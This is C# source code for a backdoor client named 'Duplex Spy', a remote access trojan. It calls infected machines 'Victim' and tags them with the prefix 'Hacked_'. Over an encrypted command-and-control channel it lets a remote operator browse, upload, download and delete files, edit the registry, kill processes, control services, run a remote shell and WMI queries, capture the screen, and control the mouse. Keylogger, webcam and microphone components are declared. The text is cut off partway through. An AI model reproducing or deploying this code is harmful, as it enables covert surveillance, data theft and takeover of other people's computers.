/* .o0o.--------------[ README ]--------------.o0o.
 * # INTRODUCTION
 * DUPLEX SPY BACKDOOR CLIENT C-SHARP VERSION V1.0.0
 * AUTHOR: ISSAC
 * LANGUAGE: C#
 * 
 * # DONE
 * SEND INFORMATION
 * 
 * 
 * [ TODO LIST ]
 * KEYLOGGER
 * REMOTE PLUGIN
 * 
 * REMOTE DESKTOP
 * 
 * FILE MANAGER
 * TASK MANAGER
 * CONNECTION MANAGER
 * SERVICE MANAGER
 * WINDOW MANAGER
 * 
 * [ END OF TODO LIST ]
 * 
 * .o0o.--------------[ README ]--------------.o0o. */

using AForge.Video;
using AForge.Video.DirectShow;

using Microsoft.Win32;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        class PacketWriter
        {
            private readonly string file_path;
            private readonly ConcurrentQueue<(long Index, byte[] Data)> packet_queue;
            private readonly SemaphoreSlim file_lock;
            private bool is_processing;
            public long file_bytes = 0;
            private long file_len;
            private Victim v;

            public PacketWriter(string file_path, long file_len, Victim v)
            {
                this.file_path = file_path;
                this.file_len = file_len;
                this.v = v;

                packet_queue = new ConcurrentQueue<(long, byte[])>();
                file_lock = new SemaphoreSlim(1, 1);
                is_processing = false;

                if (!File.Exists(file_path))
                {
                    string dir = Path.GetDirectoryName(file_path);
                    if (!Directory.Exists(dir))
                        Directory.CreateDirectory(dir);

                    File.WriteAllBytes(file_path, new byte[0]); //CREATE NEW EMPTY FILE
                }
                else
                {
                    return;
                }

                this.v = v;
            }

            public void EnqueuePacket(long idx, byte[] data)
            {
                packet_queue.Enqueue((idx, data));
                ProcessQueue();
            }

            private void ProcessQueue()
            {
                if (is_processing)
                    return;

                is_processing = true;

                //LOCK
                Task.Run(async () =>
                {
                    while (packet_queue.TryDequeue(out var packet))
                    {
                        await file_lock.WaitAsync();
                        try
                        {
                            WritePacketIntoFile(packet.Index, packet.Data);
                        }
                        finally
                        {
                            file_bytes += packet.Data.Length;
                            CheckCompleted();
                            file_lock.Release();
                        }
                    }
                    is_processing = false;
                });
            }

            private void WritePacketIntoFile(long idx, byte[] data)
            {
                using (var fs = new FileStream(file_path, FileMode.OpenOrCreate, FileAccess.Write, FileShare.Read))
                {
                    fs.Seek(idx, SeekOrigin.Begin);
                    fs.Write(data, 0, data.Length);
                }
            }

            private void CheckCompleted()
            {
                bool done = file_bytes >= file_len;
                string data = string.Join("|", new string[]
                {
                    "file",
                    "uf",
                    "state",
                    Crypto.b64E2Str(file_path),
                    done ? "OK" : ((float)(file_bytes * 100 / file_len)).ToString("F2") + " %",
                });

                v.SendCommand(data);
                if (done)
                {
                    g_packetwriter.Remove(file_path);
                }
            }
        }

        #region Configuration

        //SOCKET CONNECTION
        private string ip = "127.0.0.1";
        private int port = 5000;
        private int time_reconnect = 1000; //ms
        private int time_sendinfo = 1000; //ms
        private int dwTimeout = 100000; //ms
        private bool send_screen = true;
        private string id_prefix = "Hacked_";
        private string id_hardware = string.Empty;

        //PAYLOAD
        private string file_copy;

        private bool anti_process = false;

        #endregion

        static Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        static bool is_connected = false;

        //STORAGE
        List<frmLockScreen> fs = new List<frmLockScreen>();
        static Dictionary<string, PacketWriter> g_packetwriter = new Dictionary<string, PacketWriter>();
        List<frmLockScreen> l_frmLockScreen = new List<frmLockScreen>();

        //FUN STUFF
        static bool msg_inf = false;

        //REMOTE DESKTOP
        static bool send_screenshot = false;
        static bool send_stopped = true;

        //MANAGER
        private FuncInfo.PC funcInfoPC;
        private FuncInfo.Client funcInfoClient;
        private FuncFile funcFile;
        private FuncTask funcTask;
        private FuncReg funcReg;
        private FuncConn funcConn;
        private FuncWindow funcWindow;
        static KeyLogger keylogger;
        private Keyboard keyboard;
        private FuncMouse funcMouse;
        private RemoteShell funcShell;
        private MicAudio funcMicAudio;
        private AudioPlayer funcAudioPlayer;
        private FuncSystem funcSystem;
        private FuncServ funcServ;
        private FuncRunScript funcRunScript;

        //WEBCAM
        static Webcam webcam;
        static Webcam mulcam;

        //OTHER
        PacketWriter packet_writer;

        static byte[] CombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
        {
            byte[] bytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(first_bytes, first_idx, first_len);
                ms.Write(second_bytes, second_idx, second_len);
                bytes = ms.ToArray();
            }

            return bytes;
        }
        private byte[] StructToBytes<T>(T structure) where T : struct
        {
            int size = Marshal.SizeOf(typeof(T));
            byte[] buffer = new byte[size];
            IntPtr ptr = Marshal.AllocHGlobal(size);

            try
            {
                Marshal.StructureToPtr(structure, ptr, false);
                Marshal.Copy(ptr, buffer, 0, size);
            }
            finally
            {
                Marshal.FreeHGlobal(ptr);
            }

            return buffer;
        }
        private T BytesToStruct<T>(byte[] buffer) where T : struct
        {
            int size = Marshal.SizeOf(typeof(T));
            if (buffer.Length != size)
            {
                throw new ArgumentException("Byte array size does not match the size of the structure.");
            }

            IntPtr ptr = Marshal.AllocHGlobal(size);

            try
            {
                Marshal.Copy(buffer, 0, ptr, size);
            }
            finally
            {
                Marshal.FreeHGlobal(ptr);
            }

            return Marshal.PtrToStructure<T>(ptr);
        }

        /// <summary>
        /// Process all data from server.
        /// </summary>
        /// <param name="v"></param>
        void Received(Victim v)
        {
            try
            {
                Socket socket = v.socket;
                DSP dsp = null;
                int recv_len = 0;
                byte[] static_recvBuf = new byte[Victim.MAX_BUFFER_LENGTH];
                byte[] dynamic_recvBuf = new byte[] { };
                v.Send(1, 0, "Hello");
                do
                {
                    static_recvBuf = new byte[Victim.MAX_BUFFER_LENGTH];
                    recv_len = v.socket.Receive(static_recvBuf);
                    dynamic_recvBuf = CombineBytes(dynamic_recvBuf, 0, dynamic_recvBuf.Length, static_recvBuf, 0, recv_len);
                    if (recv_len <= 0)
                        break;
                    else if (dynamic_recvBuf.Length < DSP.HEADER_SIZE)
                        continue;
                    else
                    {
                        var head_info = DSP.GetHeader(dynamic_recvBuf);
                        while (dynamic_recvBuf.Length - DSP.HEADER_SIZE >= head_info.len)
                        {
                            dsp = new DSP(dynamic_recvBuf);
                            dynamic_recvBuf = dsp.MoreData;
                            head_info = DSP.GetHeader(dynamic_recvBuf);
                            if (dsp.Command == 0)
                            {
                                if (dsp.Param == 0) //DISCONNECT
                                {
                                    Disconnect();
                                }
                                else if (dsp.Param == 1) //RECONNECT (REFRESH KEY)
                                {
                                    Reconnect();
                                }
                            }
                            else if (dsp.Command == 1) //KEY EXCHANGE
                            {
                                if (dsp.Param == 0) //RECEIVED RSA KEY SEND ENCRYPTED AES KEY
                                {
                                    string rsa_publicKey = Crypto.b64D2Str(dsp.GetMsg().msg); //XML FORMAT
                                    rsa_publicKey = Crypto.b64D2Str(rsa_publicKey);
                                    v.key_pairs.public_key = rsa_publicKey;
                                    var aes = Crypto.AES_GenerateKeyAndIV();
                                    v._AES.key = Convert.FromBase64String(aes.key);
                                    v._AES.iv = Convert.FromBase64String(aes.iv);
                                    string payload = aes.key + "|" + aes.iv;
                                    byte[] enc_payload = Crypto.RSAEncrypt(payload, rsa_publicKey);
                                    v.Send(1, 1, enc_payload);
                                }
                                else if (dsp.Param == 2) //CHALLENGE AND RESPONSE
                                {
                                    byte[] buffer = dsp.GetMsg().msg;
                                    string payload = Encoding.UTF8.GetString(buffer);
                                    buffer = Convert.FromBase64String(payload);
                                    payload = Crypto.AESDecrypt(buffer, v._AES.key, v._AES.iv);
                                    payload = Convert.ToBase64String(Crypto.RSAEncrypt(payload, v.key_pairs.public_key));
                                    payload = Crypto.AESEncrypt(payload, v._AES.key, v._AES.iv);
                                    v.Send(1, 3, payload);
                                }
                                else if (dsp.Param == 4)
                                {
                                    new Thread(() => SendInfo(v)).Start();
                                }
                            }
                            else if (dsp.Command == 2) //COMMAND AND CONTROL
                            {
                                if (dsp.Param == 0) //RECEIVED COMMAND
                                {
                                    string payload = Encoding.UTF8.GetString(dsp.GetMsg().msg);
                                    payload = Crypto.AESDecrypt(Convert.FromBase64String(payload), v._AES.key, v._AES.iv);
                                    _Received(v, payload);
                                }
                                else if (dsp.Param == 1) //PIGN TIME, LATENCY
                                {
                                    v.encSend(2, 1, DateTime.Now.ToString("F"));
                                }
                            }
                        }
                    }
                }
                while (recv_len > 0 && is_connected);
            }
            catch (Exception ex)
            {
                is_connected = false;
                return;
            }
        }
        /// <summary>
        /// Process function data from server.
        /// </summary>
        /// <param name="v"></param>
        /// <param name="msg"></param>
        void _Received(Victim v, string msg)
        {
            try
            {
                //Split received string
                string[] cmd = msg.Split('|');

                #region Detail

                if (cmd[0] == "detail")
                {
                    if (cmd[1] == "client")
                    {
                        if (funcInfoClient == null)
                            funcInfoClient = new FuncInfo.Client();

                        if (cmd[2] == "info")
                        {
                            ClientConfig config = new ClientConfig()
                            {
                                dwRetry = time_reconnect,
                                dwTimeout = dwTimeout,
                            };

                            string b64Payload = Convert.ToBase64String(StructToBytes(config));
                        }
                        else if (cmd[2] == "set")
                        {

                        }
                    }
                    else if (cmd[1] == "pc")
                    {
                        if (funcInfoPC == null)
                            funcInfoPC = new FuncInfo.PC();

                        if (cmd[2] == "info")
                        {
                            v.SendCommand("detail|pc|info|" + funcInfoPC.Info());
                        }
                    }
                }

                #endregion
                #region FileMgr
                else if (cmd[0] == "file")
                {
                    if (cmd[1] == "init")
                    {
                        funcFile = new FuncFile();
                        string cp = funcFile.cp;
                        //string driver_info = funcFile.GetDrives();
                        DriveInfo[] drives = funcFile.GetDrives();
                        List<string> lsDrives = new List<string>();
                        foreach (DriveInfo drive in drives)
                        {
                            try
                            {
                                lsDrives.Add(string.Join(",", new string[]
                                {
                                    drive.Name.Replace("\\", string.Empty),
                                    drive.DriveType.ToString(),
                                    funcFile.BytesNormalize(drive.TotalSize),
                                    funcFile.BytesNormalize(drive.AvailableFreeSpace),
                                    drive.VolumeLabel,
                                }));
                            }
                            catch (Exception ex)
                            {

                            }
                        }
                        string driver_info = string.Join("-", lsDrives.ToArray());
                        string strShortCuts = string.Join(",", funcFile.ScanShortCut().Select(x => Crypto.b64E2Str(x)).ToArray());
                        string info = string.Join(",", funcFile.FileMgrInfo().Select(x => Crypto.b64E2Str(x)).ToArray());
                        v.SendCommand($"file|init|{cp}|{driver_info}|{strShortCuts}|{info}");
                    }
                    else if (cmd[1] == "sd") //SCAN DIR
                    {
                        string dir = cmd[2];
                        int dir_limit = int.Parse(cmd[3]);
                        int file_limit = int.Parse(cmd[4]);
                        var val = funcFile.ScanDir(dir, dir_limit, file_limit);

                        int code = val.Item1;
                        string szRet = val.Item2;
                        List<string[]> l_dir = val.Item3;
                        List<string[]> l_file = val.Item4;

                        string data = string.Join("+", l_dir.Select(x => string.Join(";", x))) + "|" + string.Join("+", l_file.Select(x => string.Join(";", x))); //funcFile.ScanDir(dir, dir_limit, file_limit);
                        if (data.Contains("|"))
                        {
                            string[] dataSplit = data.Split('|');
                            if (dataSplit[0] == "0")
                            {
                                v.SendCommand($"file|sd|error|{dataSplit[1]}");
                                return;
                            }
                        }

                        v.SendCommand($"file|sd|" + dir + "|" + data);
                    }
                    else if (cmd[1] == "goto") //GOTO DIRECTORY
                    {
                        v.SendCommand($"file|sd|{cmd[2]}|{(Directory.Exists(cmd[2]) ? "1" : "0")}");
                    }
                    else if (cmd[1] == "read")
                    {
                        v.SendCommand($"file|read|" + funcFile.ReadFile(cmd[2]));
                    }
                    else if (cmd[1] == "write")
                    {
                        string path = Crypto.b64D2Str(cmd[2]);
                        string text = Crypto.b64D2Str(cmd[3]);

                        v.encSend(2, 0, "file|write|" + funcFile.WriteFile(path, text));
                    }
                    else if (cmd[1] == "paste") //PASTE
                    {
                        if (cmd[2] == "cp" || cmd[2] == "mv")
                        {
                            string[] folders = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                            string[] files = cmd[4].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                            string dir_dst = Crypto.b64D2Str(cmd[5]);

                            v.encSend(2, 0, "file|paste|" + funcFile.PasteItems(folders, files, dir_dst, cmd[2] == "mv"));
                        }
                    }
                    else if (cmd[1] == "del") //DELETE
                    {
                        int thd_cnt = int.Parse(cmd[2]);
                        string[] folders = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                        string[] files = cmd[4].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();

                        v.encSend(2, 0, "file|del|" + funcFile.DeleteItems(folders, files));
                    }
                    else if (cmd[1] == "uf") //UPLOAD FILE
                    {
                        if (cmd[2] == "recv")
                        {
                            string filename = Crypto.b64D2Str(cmd[3]); //WRITE BYTES PATH
                            long file_len = long.Parse(cmd[4]);
                            int idx = int.Parse(cmd[5]);
                            byte[] data = Convert.FromBase64String(cmd[6]);

                            if (!g_packetwriter.ContainsKey(filename))
                                g_packetwriter.Add(filename, new PacketWriter(filename, file_len, v));

                            PacketWriter writer = g_packetwriter[filename];
                            writer.EnqueuePacket(idx, data);
                        }
                        else if (cmd[2] == "stop")
                        {

                        }
                    }
                    else if (cmd[1] == "df") //DOWNLOAD FILE
                    {
                        if (cmd[2] == "send")
                        {
                            string[] files = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();

                            funcFile.Download(files, v);
                        }
                        else if (cmd[2] == "stop")
                        {

                        }
                    }
                    else if (cmd[1] == "zip")
                    {
                        string[] folders = cmd[2].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                        string[] files = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                        string archiveName = cmd[4];

                        (List<string[]> dInfo, List<string[]> fInfo) = funcFile.Archive_Compress(folders, files, archiveName);

                        v.encSend(2, 0, string.Join("|", new string[]
                        {
                            "file",
                            "zip",

                            //Folder State.
                            string.Join(",", 
                                dInfo.Select(x => $"{Crypto.b64E2Str(x[0])}|{x[1]}")
                                .Select(x => Crypto.b64E2Str(x)).ToArray()
                            ),

                            //File State.
                            string.Join(",",
                                fInfo.Select(x => $"{Crypto.b64E2Str(x[0])}|{x[1]}")
                                .Select(x => Crypto.b64E2Str(x)).ToArray()
                            ),

                            //Archive Path
                            archiveName,
                        }));
                    }
                    else if (cmd[1] == "unzip")
                    {
                        int method = int.Parse(cmd[2]);
                        string[] archives = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                        string dirName = cmd[4];
                        bool delete = int.Parse(cmd[5]) == 1;

                        List<string[]> aInfo = funcFile.Archive_Extract(archives, dirName, method, delete);

                        v.encSend(2, 0, string.Join("|", new string[]
                        {
                            "file",
                            "unzip",

                            //Archive State.
                            string.Join(",",
                                aInfo.Select(x => $"{Crypto.b64E2Str(x[0])}|{x[1]}")
                                .Select(x => Crypto.b64E2Str(x)).ToArray()
                            ),
                        }));
                    }
                    else if (cmd[1] == "img")
                    {
                        List<string> data = funcFile.ShowImage(v, cmd[2]);
                        v.encSend(2, 0, $"file|img|" + string.Join(",", data.ToArray()));
                    }
                    else if (cmd[1] == "new")
                    {
                        if (cmd[2] == "folder")
                        {
                            try { Directory.CreateDirectory(Crypto.b64D2Str(cmd[3])); v.encSend(2, 0, "file|new|folder|1|"); }
                            catch (Exception ex) { v.encSend(2, 0, "file|new|folder|0|" + Crypto.b64E2Str(ex.Message)); }
                        }
                    }
                    else if (cmd[1] == "find")
                    {
                        string[] paths = cmd[2].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                        string[] patterns = cmd[3].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();

                        int method = int.Parse(cmd[4]);
                        bool bIgnoreCase = int.Parse(cmd[5]) == 1;
                        int itemType = int.Parse(cmd[6]);

                        List<(string, string)> results = funcFile.Find(paths, patterns, method, bIgnoreCase, itemType);

                        //Generate Payload
                        results = results.Select(x => (x.Item1, Crypto.b64E2Str(x.Item2))).ToList();
                        v.SendCommand(string.Join("|", new string[]
                        {
                            "file",
                            "find",
                            string.Join(";", results.Select(x => $"{x.Item1},{x.Item2}").ToArray()),
                        }));
                    }
                }
                #endregion
                #region TaskMgr
                else if (cmd[0] == "task")
                {
                    if (cmd[1] == "init")
                    {
                        string data = WMI_Query(Crypto.b64D2Str(cmd[2]));
                        v.encSend(2, 0, "task|init|" + data);
                    }
                    else if (cmd[1] == "start")
                    {

                    }
                    else if (cmd[1] == "kill")
                    {
                        foreach (string id in cmd[2].Split(','))
                            funcTask.Kill(int.Parse(id));
                    }
                    else if (cmd[1] == "kd") //KILL & DELETE
                    {
                        foreach (string id in cmd[2].Split(','))
                            funcTask.KillDelete(int.Parse(id));
                    }
                }
                #endregion
                #region RegEdit
                else if (cmd[0] == "reg") //REGISTRY
                {
                    if (funcReg == null)
                        funcReg = new FuncReg();

                    if (cmd[1] == "init") //INITIALIZATION
                    {
                        string data = funcReg.GetRootKeys();
                        v.encSend(2, 0, "reg|init|" + data);
                    }
                    else if (cmd[1] == "item") //SCAN DIRECTORY
                    {
                        string path = Crypto.b64D2Str(cmd[3]);
                        v.encSend(2, 0, $"reg|item|{Path.Combine(cmd[2], path)}|" + funcReg.GetItems(cmd[2], path));
                    }
                    else if (cmd[1] == "goto") //CHECK SPECIFIED PATH EXISTED
                    {
                        string path = Crypto.b64D2Str(cmd[3]);
                        v.encSend(2, 0, $"reg|goto|{Crypto.b64E2Str(Path.Combine(cmd[2], path))}|" + (funcReg.Goto(cmd[2], path) ? "1" : "0"));
                    }
                    else if (cmd[1] == "add")
                    {
                        string regFullPath = Crypto.b64D2Str(cmd[3]);
                        string itemName = Crypto.b64D2Str(cmd[4]);

                        if (cmd[2] == "key")
                        {
                            var x = funcReg.AddNewKey(regFullPath, itemName);
                            v.SendCommand($"reg|add|key|{x.Item1}|{x.Item2}");
                        }
                        else if (cmd[2] == "val")
                        {
                            RegistryValueKind kind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), cmd[5]);
                            var result = funcReg.AddNewValue(regFullPath, itemName, kind);
                            v.SendCommand($"reg|add|val|{result.Item1}|{result.Item2}");
                        }
                    }
                    else if (cmd[1] == "rename")
                    {
                        string regFullPath = Crypto.b64D2Str(cmd[3]);
                        string srcPath = Crypto.b64D2Str(cmd[4]);
                        string dstPath = Crypto.b64D2Str(cmd[5]);

                        if (cmd[2] == "key")
                        {
                            var x = funcReg.RenameKey(srcPath, dstPath);
                            v.SendCommand($"reg|rename|key|{x.Item1}|{x.Item2}");
                        }
                        else if (cmd[2] == "val")
                        {
                            var x = funcReg.RenameValue(regFullPath, srcPath, dstPath);
                            v.SendCommand($"reg|rename|val|{x.Item1}|{x.Item2}");
                        }
                    }
                    else if (cmd[1] == "edit") //Edit Key
                    {
                        string regFullPath = Crypto.b64D2Str(cmd[2]);
                        string valName = Crypto.b64D2Str(cmd[3]);
                        RegistryValueKind valKind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), cmd[4]);
                        string szValData = cmd[4];
                        object objValData = null;
                        var x = (0, "");

                        switch (valKind)
                        {
                            case RegistryValueKind.String:
                                objValData = Crypto.b64D2Str(szValData);
                                break;
                            case RegistryValueKind.ExpandString:
                                objValData = Crypto.b64D2Str(szValData);
                                break;
                            case RegistryValueKind.Binary:
                                objValData = Convert.FromBase64String(szValData);
                                break;
                            case RegistryValueKind.DWord:
                                objValData = Convert.ToInt32(szValData); //DWORD
                                break;
                            case RegistryValueKind.MultiString:
                                objValData = Crypto.b64D2Str(szValData);
                                break;
                            case RegistryValueKind.QWord:
                                objValData = Convert.ToUInt64(szValData); //QWORD
                                break;
                        }

                        if (objValData == null)
                        {
                            x.Item2 = Crypto.b64E2Str("objValData is null.");
                        }
                        else
                        {
                            x = funcReg.EditValue(regFullPath, valName, objValData);
                        }

                        v.SendCommand($"reg|edit|{regFullPath}|{valName}|{x.Item1}|{x.Item2}");
                    }
                    else if (cmd[1] == "find")
                    {
                        string[] regFullPaths = cmd[2].Split(',').Select(y => Crypto.b64D2Str(y)).ToArray();
                        string[] patterns = cmd[3].Split(',').Select(y => Crypto.b64D2Str(y)).ToArray(); //Regex Patterns.
                        int method = int.Parse(cmd[4]); //0: Name Only, 1: FullPath
                        bool bIgnoreCase = int.Parse(cmd[5]) == 1;
                        int dwType = int.Parse(cmd[6]); //0: Key, 1: Value, 2: Both.
                        RegistryValueKind kind = (RegistryValueKind)Enum.Parse(typeof(RegistryValueKind), cmd[7]);

                        List<(string, string, string)> x = funcReg.Find(regFullPaths, patterns, method, bIgnoreCase, dwType, kind);

                        string payload = string.Join(",",
                            x.Select(y =>
                            $"{y.Item1};" + //Type: k(key), v(value)
                            $"{Crypto.b64E2Str(y.Item2)};" + //Name(for key, same as path)
                            $"{Crypto.b64E2Str(y.Item3)}" //Path
                        ).ToArray());

                        v.SendCommand($"reg|find|{payload}");
                    }
                    else if (cmd[1] == "del")
                    {
                        string regFullPath = Crypto.b64D2Str(cmd[3]);

                        if (cmd[2] == "key")
                        {
                            var x = funcReg.DeleteKey(regFullPath);
                            v.SendCommand($"reg|del|key|{x.Item1}|{x.Item2}");
                        }
                        else if (cmd[2] == "val")
                        {
                            string[] valNames = cmd[4].Split(',').Select(y => Crypto.b64D2Str(y)).ToArray();
                            //var x = funcReg.DeleteValue(regFullPath, valName);
                            //v.SendCommand($"reg|del|val|{x.Item1}|{x.Item2}");
                            StringBuilder sb = new StringBuilder();
                            foreach (string valName in valNames)
                            {
                                var x = funcReg.DeleteValue(regFullPath, valName);
                                sb.Append($"{valName},{x.Item1},{Crypto.b64E2Str(x.Item2)};");
                            }

                            v.SendCommand($"reg|del|val|{cmd[3]}|{sb.ToString()}");
                        }
                    }
                    else if (cmd[1] == "export")
                    {
                        string regFullPath = Crypto.b64D2Str(cmd[2]);
                        string servPath = Crypto.b64D2Str(cmd[3]);

                        var x = funcReg.Export(regFullPath, servPath);
                        v.SendCommand($"reg|export|{x.Item1}|{x.Item2}|{cmd[3]}");
                    }
                    else if (cmd[1] == "import")
                    {
                        string content = Crypto.b64D2Str(cmd[2]);
                        string tmpFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Templates), Path.GetTempFileName() + ".reg");
                        File.WriteAllText(tmpFile, content);
                        var x = funcReg.Import(tmpFile);

                        if (File.Exists(tmpFile))
                            File.Delete(tmpFile);

                        v.SendCommand($"reg|import|{x.Item1}|{x.Item2}");
                    }
                }
                #endregion
                #region Connection Info
                else if (cmd[0] == "conn")
                {
                    if (funcConn == null)
                        funcConn = new FuncConn();

                    if (cmd[1] == "init")
                    {
                        v.encSend(2, 0, "conn|init|" + funcConn.GetConn());
                    }
                }
                #endregion
                #region ServMgr
                else if (cmd[0] == "serv")
                {
                    if (cmd[1] == "init")
                    {
                        string data = WMI_Query(Crypto.b64D2Str(cmd[2]));
                        v.encSend(2, 0, "serv|init|" + data);
                    }
                    else if (cmd[1] == "control")
                    {
                        string[] names = Crypto.b64D2Str(cmd[2]).Split(',').Select(x => Crypto.b64E2Str(x)).ToArray();
                        string status = cmd[3];
                        if (status == "restart")
                        {
                            funcServ.ServiceControl(names, "Stopped");
                            v.encSend(2, 0, "serv|control|" + funcServ.ServiceControl(names, "Running"));
                        }
                        else
                        {
                            v.encSend(2, 0, "serv|control|" + funcServ.ServiceControl(names, status));
                        }
                    }
                }
                #endregion
                #region WindowMgr
                else if (cmd[0] == "window")
                {
                    if (funcWindow == null)
                        funcWindow = new FuncWindow();

                    if (cmd[1] == "init")
                    {
                        v.encSend(2, 0, "window|init|" + funcWindow.GetWindow());
                    }
                    else if (cmd[1] == "shot")
                    {
                        string b64_img = funcWindow.Capture(new IntPtr(int.Parse(cmd[2])));
                        v.encSend(2, 0, $"window|shot|{cmd[2]}|" + b64_img);
                    }
                }
                #endregion
                #region System Informaiton
                else if (cmd[0] == "system") //WINDOWS SYSTEM (CONTROL PANEL)
                {
                    if (funcSystem == null)
                        funcSystem = new FuncSystem();

                    if (cmd[1] == "app")
                    {
                        if (cmd[2] == "init") //GET APPLICATION LIST
                        {
                            List<string[]> apps = funcSystem.ListApp();
                            string data = string.Join(",", apps.Select(x => string.Join(";", x.Select(y => Crypto.b64E2Str(y)))).ToArray());
                            v.encSend(2, 0, "system|app|init|" + data);
                        }
                        else if (cmd[2] == "detail") //GET MORE INFORMATION OF SPECIFIED APPLCIATION.
                        {
                            string id = Crypto.b64E2Str(cmd[3]);
                            string query = $"select * from win32_product where productid = '{id}'";
                            string[] fields = Global.WMI_QueryNoEncode(query);


                        }
                    }
                    else if (cmd[1] == "ev") //ENVIRONMENT VARIABLE
                    {
                        if (cmd[2] == "init")
                        {
                            string[] ev = funcSystem.GetEnvironmentVariables().Select(x => Crypto.b64E2Str(x)).ToArray();
                            v.encSend(2, 0, "system|ev|init|" + string.Join(",", ev));
                        }
                        else if (cmd[2] == "set")
                        {
                            string type = cmd[3]; //User, System
                            string key = cmd[4];
                            string val = Crypto.b64E2Str(cmd[5]);
                        }
                    }
                    else if (cmd[1] == "device")
                    {
                        if (cmd[2] == "init")
                        {
                            List<string[]> devices = funcSystem.Device_ListDevices();
                            string data = string.Join(",", devices.Select(x => string.Join(";", x.Select(y => Crypto.b64E2Str(y)).ToArray())).ToArray());
                            v.encSend(2, 0, "system|device|init|" + data);
                        }
                        else if (cmd[2] == "enable") //ENABLE, DISABLE
                        {
                            v.encSend(2, 0, $"system|device|{cmd[2]}|" + funcSystem.Device_Enable(cmd[3], bool.Parse(cmd[4])));
                        }
                    }
                    else if (cmd[1] == "startup") //START UP
                    {
                        if (cmd[2] == "init")
                        {
                            List<string[]> apps = funcSystem.GetStartUp();

                        }
                    }
                    else if (cmd[1] == "if")
                    {
                        if (cmd[2] == "init")
                        {
                            List<string[]> interfaces = funcSystem.If_ListInterface();
                            v.encSend(2, 0, "system|if|init|" + string.Join(",", interfaces.Select(x => string.Join(";", x.Select(y => Crypto.b64E2Str(y)).ToArray())).ToArray()));
                        }
                        else if (cmd[2] == "enable") //ENABLE, DISABLE
                        {
                            v.encSend(2, 0, $"system|if|{cmd[2]}|" + funcSystem.If_Enable(Crypto.b64D2Str(cmd[3]), bool.Parse(cmd[4])));
                        }
                    }
                }
                #endregion
                #region Shell
                else if (cmd[0] == "shell")
                {
                    if (cmd[1] == "start")
                    {
                        string exePath = Crypto.b64D2Str(cmd[2]);
                        string init_path = Crypto.b64D2Str(cmd[3]);
                        funcShell = new RemoteShell(v, exePath, init_path);
                    }
                    else if (cmd[1] == "cmd")
                    {
                        funcShell.SendCmd(Crypto.b64D2Str(cmd[2]));
                    }
                    else if (cmd[1] == "tab")
                    {
                        funcShell.ProcessTab(Crypto.b64D2Str(cmd[2]));
                    }
                    else if (cmd[1] == "ctrl")
                    {
                        //cmd[2]: CtrlC, CtrlZ
                        ShellCtrl ctrl = (ShellCtrl)Enum.Parse(typeof(ShellCtrl), cmd[2]);

                    }
                }
                #endregion
                #region WMI Shell
                else if (cmd[0] == "wmi")
                {
                    try { v.encSend(2, 0, "wmi|output|" + WMI_Query(Crypto.b64D2Str(cmd[1]))); }
                    catch (Exception ex) { v.encSend(2, 0, "wmi|error|" + Crypto.b64E2Str(ex.Message)); }
                }
                #endregion
                #region Remote Desktop(Monitor)
                else if (cmd[0] == "desktop")
                {
                    if (cmd[1] == "init")
                    {
                        DesktopInit(v);
                    }
                    else if (cmd[1] == "start" || cmd[1] == "screenshot")
                    {
                        string[] tmp = cmd[2].Split(',');
                        string device_name = tmp[0];
                        int width = int.Parse(tmp[1]);
                        int height = int.Parse(tmp[2]);

                        if (cmd[1] == "start")
                        {
                            send_screenshot = false;
                            while (!send_stopped)
                                Thread.Sleep(100);

                            send_screenshot = true;
                            send_stopped = false;
                            new Thread(() => DesktopStart(v, device_name, width, height)).Start();
                        }
                        else
                        {
                            new Thread(() => v.encSend(2, 0, "desktop|screenshot|" + ScreenShot(v, device_name, width, height) + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"))).Start();
                        }
                    }
                    else if (cmd[1] == "stop")
                    {
                        send_screenshot = false;
                    }
                }
                #endregion
                #region Mouse Control
                else if (cmd[0] == "mouse")
                {
                    if (funcMouse == null)
                        funcMouse = new FuncMouse();

                    if (cmd[1] == "status")
                    {
                        v.encSend(2, 0, $"mouse|status|" + funcMouse.Status());
                    }
                    else if (cmd[1] == "move")
                    {
                        Cursor.Position = new Point(int.Parse(cmd[2]), int.Parse(cmd[3]));
                    }
                    else if (cmd[1] == "btn")
                    {
                        switch (cmd[2])
                        {
                            case "RD":
                                funcMouse.MouseRD();
                                break;
                            case "RU":
                                funcMouse.MouseRU();
                                break;
                            case "LD":
                                funcMouse.MouseLD();
                                break;
                            case "LU":
                                funcMouse.MouseLU();
                                break;
                            case "LC":
                                funcMouse.MouseLC();
                                break;
                            case "RC":
                                funcMouse.MouseClk();
                                break;
                            case "SC":
                                funcMouse.MouseSC(int.Parse(cmd[3]));
                                break;
                        }
                    }
                    else if (cmd[1] == "lock")
                    {
                        funcMouse.Lock();
                    }
                    else if (cmd[1] == "ulock")
                    {
                        funcMouse.Unlock();
                    }
                    else if (cmd[1] == "crazy")
                    {
                        funcMouse.Crazy();
                    }
                    else if (cmd[1] == "calm")
                    {
                        funcMouse.Calm();
                    }
                    else if (cmd[1] == "hide")
                    {
                        funcMouse.Hide();
                    }
                    else if (cmd[1] == "show")
                    {
                        funcMouse.Show();
                    }
                }
                #endregion
                #region Keyboard Control
